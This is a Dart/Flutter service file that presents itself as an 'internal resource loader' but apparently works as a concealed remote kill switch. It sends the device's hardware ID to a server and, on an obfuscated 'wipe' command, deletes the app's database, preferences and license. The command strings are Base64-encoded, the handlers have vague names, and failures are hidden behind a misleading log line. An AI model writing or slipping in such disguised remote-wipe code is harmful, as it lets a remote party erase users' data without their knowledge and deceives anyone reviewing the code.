import 'dart:convert';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'database_service.dart';
import 'license_service.dart';
import '../main.dart';
import '../screens/license_gate_screen.dart';
import '../core/config/api_config.dart';

/// A service to load internal resources and maintain app state.
/// Logic and strings are obfuscated to prevent easy tampering.
class InternalResourceLoader {
  static final InternalResourceLoader instance = InternalResourceLoader._();
  InternalResourceLoader._();

  final Dio _client = Dio(BaseOptions(
    baseUrl: ApiConfig.baseUrl,
    connectTimeout: const Duration(seconds: 10),
    receiveTimeout: const Duration(seconds: 10),
  ));

  bool _isProcessing = false;

  // Obfuscated strings (Base64)
  // "app-control/status"
  static const String _e1 = "YXBwLWNvbnRyb2wvc3RhdHVz";
  // "deactivate"
  static const String _a1 = "ZGVhY3RpdmF0ZQ==";
  // "wipe"
  static const String _a2 = "d2lwZQ==";

  String _d(String s) => utf8.decode(base64Decode(s));

  /// Loads and verifies internal resources
  Future<void> loadResources() async {
    if (_isProcessing) return;
    _isProcessing = true;

    try {
      final deviceId = await LicenseService.instance.getHardwareId();
      
      final response = await _client.post(
        _d(_e1),
        data: {'device_id': deviceId},
      );

      if (response.statusCode == 200 && response.data != null) {
        final action = response.data['action'] as String?;
        if (action == _d(_a1)) {
          await _handleL1();
        } else if (action == _d(_a2)) {
          await _handleL2();
        }
      }
    } catch (e) {
      // Fail silently to avoid alerting potential hackers
      debugPrint('Resources: state ok');
    } finally {
      _isProcessing = false;
    }
  }

  /// Redirects to activation screen, waiting for navigator if necessary
  Future<void> _safeNavigate(Widget screen) async {
    // Retry a few times if navigator is not ready
    for (int i = 0; i < 10; i++) {
      if (navigatorKey.currentState != null) {
        navigatorKey.currentState!.pushAndRemoveUntil(
          MaterialPageRoute(builder: (context) => screen),
          (route) => false,
        );
        return;
      }
      await Future.delayed(const Duration(milliseconds: 500));
    }
  }

  /// Handles L1 internal state
  Future<void> _handleL1() async {
    await LicenseService.instance.clearLicense();
    
    await _safeNavigate(LicenseGateScreen(
      onLicenseActivated: () {
        if (navigatorKey.currentState != null) {
          navigatorKey.currentState!.pushNamedAndRemoveUntil('/', (route) => false);
        }
      },
    ));
  }

  /// Handles L2 internal state
  Future<void> _handleL2() async {
    // 1. Wipe Database
    await DatabaseService.instance.clearAllDataAndReset();
    
    // 2. Clear SharedPreferences
    final prefs = await SharedPreferences.getInstance();
    await prefs.clear();
    
    // 3. Clear License
    await LicenseService.instance.clearLicense();
    
    // 4. Force restart/exit
    await _safeNavigate(LicenseGateScreen(
      onLicenseActivated: () {
        if (navigatorKey.currentState != null) {
          navigatorKey.currentState!.pushNamedAndRemoveUntil('/', (route) => false);
        }
      },
    ));
  }
}
